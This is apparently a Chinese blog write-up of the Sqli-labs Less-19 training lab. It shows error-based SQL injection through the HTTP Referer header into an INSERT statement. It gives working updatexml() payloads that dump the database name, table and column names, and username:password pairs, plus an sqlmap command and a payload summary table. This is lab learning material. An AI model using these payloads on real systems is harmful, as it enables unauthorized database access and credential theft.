---
title: Sqli-labs Less-19 Writeup
date: 2026-11-19
categories: 渗透测试
tags: [Sqli-labs, SQL注入, Web, HTTP头部注入, Referer, 报错注入]
---
## 一、 漏洞概述
- **关卡**：Less-19
- **漏洞类型**：基于报错的 HTTP 头部注入（Error-Based HTTP Header SQL Injection）
- **注入点**：HTTP 请求头中的 `Referer` 字段
- **闭合方式**：单引号 `'`
- **后端语句**：`INSERT INTO`

## 二、 渗透测试过程

### 1. 探测注入点与页面逻辑
访问 Less-19 关卡，页面提示输入用户名和密码。使用正确的凭证（如 `admin` / `admin`）登录。
登录成功后，页面回显了当前的 `Referer` 和 `IP` 地址。结合 Less-18 的经验，说明后端执行了 `INSERT` 语句，将 `Referer` 和 `IP` 记录到了数据库表中。

由于 `uname` 和 `passwd` 被严格过滤，且 `User-Agent` 在本关卡未被执行，目标锁定在 `Referer` 请求头。

### 2. 探测闭合方式与报错回显
开启 Burp Suite 拦截登录请求。在请求头中添加或修改 `Referer` 字段：
```http
Referer: 1'
```

放行请求后，页面直接返回了 SQL 语法报错：
You have an error in your SQL syntax... near ''1'', '127.0.0.1')' at line 1。
由此确认：

1. Referer 存在单引号 ' 闭合的注入漏洞。
2. 后端语句结构大致为 INSERT INTO referers (referer, ip_address) VALUES ('$referer', '$ip')。
3. 页面有报错回显，继续采用 updatexml() 报错注入。

### 3. 构造报错注入 Payload

由于 Referer 对应的字段是插入语句的第一个参数，需要构造合法的闭合。根据报错信息，后端有两个字段，闭合方式为 ')。

· 注入结构构造：
  将 Referer 设置为：1', updatexml(1,concat(0x7e,(select database())),1)) #
  拼接后的 SQL 变为：INSERT INTO referers (referer, ip_address) VALUES ('1', updatexml(1,concat(0x7e,(select database())),1)) #', '$ip')。
  注：1' 闭合第一个参数，, 分割字段，updatexml 触发报错，) 闭合后续的括号，# 注释掉剩余的 $ip 部分。

### 4. 爆出数据

在 Burp Suite 中修改 Referer 字段，获取当前数据库名：

· Payload：
  ```http
  Referer: 1', updatexml(1,concat(0x7e,(select database())),1)) #
  ```
  结果：页面回显报错 XPATH syntax error: '~security'，成功爆出库名。
· 获取表名：
  ```http
  Referer: 1', updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1)),1)) #
  ```
· 获取用户名和密码：
  ```http
  Referer: 1', updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),1,32)),1)) #
  ```

## 三、 自动化利用 (SQLMap)

使用 SQLMap 时，可以使用 --referer 参数指定注入点：

```bash
sqlmap -u "http://localhost/sqli-labs-master/Less-19/" --data="uname=admin&passwd=admin&submit=Submit" --referer="1*" --batch --current-db
```

(注：--referer="1*" 告诉 SQLMap 在 Referer 字段的 1 后面进行注入测试。)

## 四、 通关 Payload 汇总

测试目的 Payload (修改 Referer 字段)
测试闭合 1'
获取库名 1', updatexml(1,concat(0x7e,(select database())),1)) #
获取表名 1', updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1)),1)) #
获取字段名 1', updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1)),1)) #
